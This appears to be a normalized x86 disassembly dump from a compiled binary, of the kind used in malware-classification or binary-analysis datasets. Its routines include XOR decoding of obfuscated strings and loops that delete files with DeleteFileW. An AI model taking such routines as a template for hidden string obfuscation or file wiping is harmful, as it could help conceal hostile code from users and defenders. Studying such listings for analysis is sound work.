mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
push eax
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_10062840
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ee1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
add edi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] edi
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_100404a0
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0xc ]
je r-xdata
sub_100628cd
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10070ff0
add esi 0x24
cmp esi edi
jne r-xdata
sub_10062900
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10045fcf
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100629b0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
imul eax [ ebp - 0x4 ]
pop edi
pop esi
and eax 0x3f
pop ebx
mov esp ebp
pop ebp
retn 0x4
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
sub_10062a56
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100424ab
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10062b65
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_1001f84c
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_10062bac
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_10062be0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
lea edi [ ebp - 0x50 ]
push edi
xor ebx ebx
mov esi edx
mov [ ebp - 0x50 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
mov [ ebp - 0x60 ] ebx
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x5c ]
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x5c ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x94
call sub_10053240
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x60 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xb5
call sub_10053240
lea edx [ ebp - 0x58 ]
mov [ ebp - 0x58 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x58 ]
push ecx
call sub_10018280
mov edx [ ebp - 0x58 ]
push edx
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x33
call sub_10053240
mov [ ebp - 0x60 ] 0x3
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
sub_10062d10
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x40
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_10062d50
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ esi ] al
mov eax [ ebp + 0x10 ]
push eax
push edx
push ecx
mov ecx esi
call sub_1004efe0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10062d93
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10033f7e
test al al
je r-xdata
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_1001eb83
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1007084d
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
lea ebx [ edi + edi ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
sub_10062e20
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10062e80
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xd8 ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xdc ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xdc ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xdc ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
sub_10063000
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
cmp [ eax ] edx
je r-xdata
add [ esi + 0x10 ] 0xfffffff8
xor eax eax
pop esi
pop ebp
retn
lea ecx [ eax - 0x8 ]
push edi
lea esp [ esp ]
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
pop edi
sub_10063060
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] cx
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100187af
add esp 0x4
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_1007f5d0
add esp 0xc
sub_100630b0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
lea eax [ ecx * 4 ]
push eax
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_10063110
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a480
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3e8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3f8 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
mov [ esp + 0x1c ] ebx
cmp [ ebx + 0x8 ] edi
jne r-xdata
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
add ebx 0xb4
mov [ esp + 0x400 ] edi
mov esi [ ebx ]
mov ecx [ ebx + 0x4 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebx
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax ebx
mov ebx [ esp + 0x1c ]
mov ecx ebx
lea esi [ esp + 0x3c ]
call sub_10061b80
mov [ esp + 0x400 ] 0x2
mov ecx [ r--data ]
mov [ esp + 0x20 ] edi
mov [ esp + 0x34 ] edi
xor eax eax
xor edi edi
mov [ esp + 0x14 ] edi
mov ecx [ esp + 0x3f8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e0 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ esp + eax * 2 + 0x194 ] dx
inc eax
cmp eax 0x25
jb r-xdata
lea ecx [ esp + 0x194 ]
push ecx
lea edx [ esp + 0xbc ]
xor eax eax
add ebx 0xc
push edx
mov [ esp + 0x1e6 ] ax
mov [ esp + 0x18 ] ebx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0x3
call sub_100205a0
mov [ esp + 0x400 ] 0x2
cmp [ esp + 0xcc ] 0x8
jb r-xdata
lea edx [ esp + 0xb4 ]
push edx
lea ecx [ esp + 0xb4 ]
push ecx
call sub_10037500
add esp 0x8
lea ecx [ esp + 0x94 ]
lea edi [ esp + 0x24 ]
call sub_10048ba0
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov eax [ eax ]
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x3c ]
lea edi [ esp + 0x2c ]
call sub_10046560
test eax eax
je r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_100187af
add esp 0x4
mov esi [ ebx ]
mov ecx [ ebx + 0x4 ]
mov edi [ esp + 0x14 ]
inc [ esp + 0x10 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edi 0x1c
add eax edx
mov [ esp + 0x14 ] edi
cmp [ esp + 0x10 ] eax
jb r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x34 ]
cmp eax 0x1e84800
jge r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
mov [ esp + 0xa8 ] 0x7
mov [ esp + 0xa4 ] eax
mov [ esp + 0x94 ] cx
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
push 0xffffffff
push eax
add esi edi
push esi
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x40c ] 0x1
call sub_100404a0
xor eax eax
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
mov eax [ ebx ]
add eax edi
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
xor edi edi
lea edx [ esp + 0x38 ]
mov eax 0x46
call sub_10045930
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x1fc ]
mov [ esp + 0x2c ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_1005c3d0
mov esi eax
test esi esi
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7f
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x39
jb r-xdata
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x20 ]
push edx
push eax
lea eax [ esp + 0x1ec ]
call sub_10005c30
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x11c ]
mov eax 0x9
call sub_10045930
push esi
lea esi [ esp + 0x98 ]
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea eax [ esp + 0x11c ]
push eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x408 ] 0x5
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xd4 ]
mov [ esp + 0x400 ] 0x6
call sub_10057920
mov ebx 0x7
mov edx eax
lea ecx [ ebx + 0x4 ]
mov [ esp + 0x400 ] bl
call sub_100205a0
mov esi 0x8
cmp [ esp + 0xe8 ] esi
jb r-xdata
lea ecx [ esp + 0x11c ]
push ecx
lea edx [ esp + 0xbc ]
xor eax eax
push edx
mov [ esp + 0x196 ] ax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0x4
call sub_100205a0
cmp [ esp + 0xcc ] 0x8
jb r-xdata
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
xor edi edi
xor eax eax
mov [ esp + 0xe8 ] ebx
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] ax
cmp [ esp + 0xcc ] esi
jb r-xdata
mov edx [ esp + 0xd4 ]
push edx
call sub_100187af
add esp 0x4
lea eax [ esp + 0x3c ]
mov [ esp + 0x400 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x24 ]
test esi esi
je r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esp + 0x18 ]
mov esi [ eax ]
mov edi [ esp + 0x1c ]
mov ebx [ DeleteFileW@IAT ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov edi edi
mov edi [ esp + 0x18 ]
mov esi [ edi ]
mov edx [ esp + 0x1c ]
cmp esi [ edx + 0xb8 ]
je r-xdata
lea esp [ esp ]
xor edx edx
mov [ esp + 0xcc ] ebx
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] dx
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov ecx [ esp + 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
cmp eax ecx
je r-xdata
mov ebx [ DeleteFileW@IAT ]
lea esp [ esp ]
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
lea eax [ esp + 0x3c ]
mov [ esp + 0x400 ] 0x0
call sub_1001f5f0
mov esi [ esp + 0x24 ]
cmp esi edi
je r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_100187af
add esp 0x4
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esp + 0x14 ]
push edx
push ecx
call sub_1003e8a0
mov ebx eax
mov eax [ esp + 0x20 ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
mov edx [ esp + 0x14 ]
push edx
push ecx
call sub_1003e8a0
mov edi [ edi + 0x4 ]
mov ebx eax
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
lea edx [ esp + 0x1e4 ]
push edx
call sub_1004cc40
mov esi eax
lea eax [ esp + 0x1e4 ]
push eax
call ebx
xor eax eax
test esi esi
je r-xdata
mov ecx [ r--data ]
xor eax eax
nop
mov edx [ esp + 0x18 ]
mov [ edx + 0x4 ] ebx
mov ebx [ DeleteFileW@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ esp + eax * 2 + 0xf0 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0xf0 ]
push ecx
lea edx [ esp + 0x98 ]
xor eax eax
push edx
mov [ esp + 0x120 ] ax
call sub_10017cc0
add esp 0x8
mov [ esp + 0x400 ] 0x8
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx + 0x4 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call ebx
mov eax [ esp + 0x1c ]
add esi 0x1c
cmp esi [ eax + 0xb8 ]
jne r-xdata
mov ecx [ r--data ]
mov ecx [ r--data ]
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
push ecx
lea esi [ esp + 0x98 ]
mov [ esp + 0x196 ] ax
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea edx [ esp + 0x11c ]
push edx
lea eax [ esp + 0xd8 ]
push eax
mov [ esp + 0x408 ] 0x9
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xb8 ]
mov [ esp + 0x400 ] 0xa
call sub_10057920
mov ecx 0xb
mov edx eax
mov [ esp + 0x400 ] cl
call sub_100205a0
cmp [ esp + 0xcc ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov edx eax
mov ecx 0xb
call sub_100205a0
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ esp + eax * 2 + 0xf0 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0xf0 ]
push ecx
lea edx [ esp + 0x98 ]
xor eax eax
push edx
mov [ esp + 0x120 ] ax
call sub_10017cc0
add esp 0x8
mov [ esp + 0x400 ] 0xf
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
xor edi edi
xor edx edx
mov ebx 0x8
mov esi 0x7
mov [ esp + 0xcc ] esi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] dx
cmp [ esp + 0xe8 ] ebx
jb r-xdata
mov ecx [ esp + 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
push esi
lea esi [ esp + 0x98 ]
mov [ esp + 0x196 ] ax
call sub_10045cc0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0x11c ]
push ecx
lea edx [ esp + 0xd8 ]
push edx
mov [ esp + 0x408 ] 0xc
call sub_10017cc0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xb8 ]
mov [ esp + 0x400 ] 0xd
call sub_10057920
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0xe
call sub_100205a0
cmp [ esp + 0xcc ] 0x8
jb r-xdata
xor ecx ecx
mov [ esp + 0xe8 ] esi
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] cx
cmp [ esp + 0xa8 ] ebx
jb r-xdata
mov eax [ esp + 0xd4 ]
push eax
call sub_100187af
